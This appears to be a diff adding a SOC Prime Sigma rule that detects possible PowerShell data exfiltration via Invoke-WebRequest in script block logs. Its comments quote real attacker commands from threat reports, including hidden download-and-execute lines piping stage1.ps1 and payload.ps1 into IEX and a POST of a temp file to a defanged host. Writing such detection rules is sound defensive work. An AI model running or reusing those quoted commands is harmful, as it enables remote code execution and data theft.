@@ -1,0 +1,62 @@
+id: fcxqFjdno1SH
+name: Possible Data Exfiltration over WebRequests (via powershell)
+body: |-
+  title: Possible Data Exfiltration over WebRequests (via powershell)
+  id: 93ec52aa-776a-4976-8209-bc68321c75b7
+  status: stable
+  description: Adversaries can use default PowerShell cmdlets for data exfiltration. To reduce false positives, there is a need to exclude legitimate scripts that are used for legitimate purposes.
+  references:
+      - https://www.air.security/blog-posts/solanacry
+      - https://cert.gov.ua/article/6318437
+      - https://socket.dev/blog/axios-npm-package-compromised
+      - https://cert.gov.ua/article/6286219
+      - https://harfanglab.io/insidethelab/hijackloader-abusing-genuine-certificates/
+      - https://research.checkpoint.com/2024/magnet-goblin-targets-publicly-facing-servers-using-1-day-vulnerabilities/
+      - https://www.zscaler.com/blogs/security-research/statc-stealer-decoding-elusive-malware-threat
+      - https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps
+      - https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/
+      - https://asec.ahnlab.com/en/92183/
+      - https://www.picussecurity.com/resource/blog/t1059-001-powershell
+  author: SOC Prime Team
+  tags:
+      - attack.exfiltration
+      - attack.t1567
+      - attack.execution
+      - attack.t1059.001
+  logsource:
+      product: windows
+      service: powershell
+      definition: 'It is recommended to use the new Script Block Logging of PowerShell v5'
+  detection:
+      selection:
+          - ScriptBlockText|contains: '-UseBasicParsing).Content' # (iwr $url -UseBasicParsing).Content https://www.air.security/blog-posts/solanacry
+          - ScriptBlockText|contains|all:
+              - 'Invoke-WebRequest'
+              - '-Method'
+              - '-Body'
+              - '-Uri' #https://cert.gov.ua/article/6286219; https://socket.dev/blog/axios-npm-package-compromised
+          - ScriptBlockText|contains|all:
+              - 'Invoke-WebRequest'
+              - '-Method'
+              #- 'POST' #Invoke-WebRequest -Uri https[:]//topgearmemory[.]com/kdsfedafa/stat?c= -Method POST -InFile C:\Users\\AppData\Local\Temp\\41075.txt -UseDefaultCredentials -UseBasicParsing ; Remove-Item C:\Users\\AppData\Local\Temp\\41075.txt
+              - '-InFile'
+              - '-UseDefaultCredentials'
+          - ScriptBlockText|contains|all:
+              - 'iwr' #cmd.exe /c start "" /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -uri 'https://hilarious-trifle-d9182e[.]netlify[].]app/stage1.ps1' -UseBasicParsing | IEX"; https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/; https://asec.ahnlab.com/en/92183/; https://cert.gov.ua/article/6318437
+              - 'UseBasicParsing'
+              - 'uri'
+          - ScriptBlockText|contains|all:
+              - 'iwr' #powershell /w 1 /c "ic -scriptblock $([ScriptBlock]::Create([System.Text.Encoding]::UTF8.getString((iwr hxxp://45[.]200[.]148[.]157:8878/payload.ps1).content)))"; https://www.picussecurity.com/resource/blog/t1059-001-powershell
+              - '/w '
+              - '/c '
+      filters:
+          ScriptBlockText|contains:
+              - 'slackb.com/error' #Invoke-WebRequest -Uri https://slackb.com/error -Method POST -Headers "@{'X-Slack-Ses-Id' =...
+      condition: selection and not filters
+  falsepositives:
+      - slack
+      - Administrative scripts.
+  level: medium
+level: medium
+created: '2023-08-09T12:39:59Z'
+updated: '2026-11-04T12:08:28.568000Z'
